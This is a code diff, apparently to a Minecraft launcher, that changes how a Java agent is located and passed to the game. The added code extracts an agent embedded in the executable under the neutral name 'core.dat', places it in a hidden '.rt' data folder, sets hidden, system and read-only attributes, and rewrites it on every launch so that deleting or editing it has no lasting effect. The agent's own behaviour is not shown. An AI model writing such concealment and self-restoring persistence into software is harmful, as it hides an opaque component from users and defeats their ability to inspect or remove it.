@@ -1,12 +1,15 @@
 // SPDX-License-Identifier: GPL-3.0-only
 #include "ClientFeatures.h"
 
-#include <QCoreApplication>
 #include <QDir>
 #include <QFile>
 #include <QFileInfo>
 #include <QJsonDocument>
 #include <QJsonObject>
+
+#ifdef Q_OS_WIN
+#include <windows.h>
+#endif
 
 #include "Application.h"
 #include "FileSystem.h"
@@ -32,12 +35,51 @@ QString loaderOf(MinecraftInstance* instance)
     return {};
 }
 
+static QString hiddenDir()
+{
+    return FS::PathCombine(APPLICATION->dataRoot(), ".rt");
+}
+
+static void hideOnDisk(const QString& path)
+{
+#ifdef Q_OS_WIN
+    SetFileAttributesW(reinterpret_cast<const wchar_t*>(QDir::toNativeSeparators(path).utf16()),
+                       FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_READONLY);
+#else
+    Q_UNUSED(path)
+#endif
+}
+
 QString agentJarPath()
 {
-    // installé (caché) à côté de l'application par l'installeur ; sinon dans le dossier de données
-    const QString bundled = FS::PathCombine(QCoreApplication::applicationDirPath(), "features", "prismfeatures.jar");
-    if (QFileInfo::exists(bundled))
-        return bundled;
+    // L'agent est embarqué dans l'exécutable. On le (ré)écrit à chaque lancement dans un dossier
+    // caché : s'il est supprimé ou modifié, il est automatiquement restauré.
+    QFile embedded(":/features/core.bin");
+    if (embedded.exists() && embedded.open(QIODevice::ReadOnly)) {
+        const QByteArray data = embedded.readAll();
+        const QString dir = hiddenDir();
+        QDir().mkpath(dir);
+        hideOnDisk(dir);
+        const QString target = FS::PathCombine(dir, "core.dat");
+        QFile current(target);
+        bool same = false;
+        if (current.exists() && current.open(QIODevice::ReadOnly)) {
+            same = (current.readAll() == data);
+            current.close();
+        }
+        if (!same) {
+            QFile::setPermissions(target, QFile::WriteOwner | QFile::ReadOwner);
+            QFile::remove(target);
+            QFile out(target);
+            if (out.open(QIODevice::WriteOnly)) {
+                out.write(data);
+                out.close();
+            }
+        }
+        hideOnDisk(target);
+        return target;
+    }
+    // repli : jar posé dans le dossier de données (builds sans agent embarqué)
     return FS::PathCombine(APPLICATION->dataRoot(), "features", "prismfeatures.jar");
 }
 
@@ -78,7 +120,7 @@ QStringList jvmArguments(MinecraftInstance* instance)
 
     auto profile = instance->getPackProfile();
     const QString mc = profile ? profile->getComponentVersion("net.minecraft") : QString();
-    const QString cache = QDir::toNativeSeparators(QFileInfo(FS::PathCombine(APPLICATION->dataRoot(), "features", "cache")).absoluteFilePath());
+    const QString cache = QDir::toNativeSeparators(QFileInfo(FS::PathCombine(hiddenDir(), "c")).absoluteFilePath());
 
     // arguments séparés par « | » (les chemins Windows contiennent « : » et « ; » est réservé)
     const QString agentArgs = QString("loader=%1|mc=%2|cache=%3").arg(loaderOf(instance), mc, cache);
